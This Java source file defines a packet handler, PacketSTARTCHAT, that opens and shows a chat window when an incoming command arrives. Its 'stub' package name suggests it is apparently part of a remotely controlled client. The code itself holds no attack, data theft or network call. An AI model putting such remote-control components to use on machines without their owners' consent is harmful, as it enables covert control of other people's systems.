package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.FrameChat;

public class PacketSTARTCHAT extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.frameChat = new FrameChat();
		Connection.frameChat.setVisible(true);
	}

}
